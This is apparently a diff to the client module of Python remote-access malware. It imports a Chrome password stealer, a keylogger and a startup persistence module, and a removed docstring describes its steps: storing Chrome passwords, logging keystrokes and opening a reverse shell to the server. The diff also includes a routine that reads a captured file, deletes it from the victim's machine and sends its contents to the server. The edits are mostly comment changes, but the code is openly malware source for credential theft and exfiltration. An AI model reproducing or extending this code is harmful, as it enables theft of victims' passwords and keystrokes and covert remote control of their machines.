@@ -5,6 +5,7 @@ from chrome_passwords import ChromePass
 from keylogger import KeyLogger
 from startup import Startup
 import os
+from time import sleep
 
 
 class Client:
@@ -25,7 +26,7 @@ class Client:
         :param host: The server's IP
         
         optional:
-        :param port: The server's port number
+        :param port: The server's port number for main connection
         :param file_port: The port number used for the file transfer
         :param keylog_filename: The file's name where the keystrokes are stored
         :param chromepass_filename: The file name where the chrome passwords are stored
@@ -57,9 +58,7 @@ class Client:
 
     def run(self) -> None:
         """
-        1. Stores Google Chrome passwords to file
-        2. Starts logging key events to file
-        3. Gets a reverse shell from client to server
+        Opens menu and performs features
         """
 
         while 1:
@@ -191,10 +190,10 @@ class Client:
         with open(filename, "r") as f:
             file_content = f.read()
 
-        # Remove file
+        # Remove file from client
         os.remove(filename)
 
-        # Send the file data
+        # Send the file data to server
         self.send_data(file_content, file_sock)
 
         # Close connection when finished
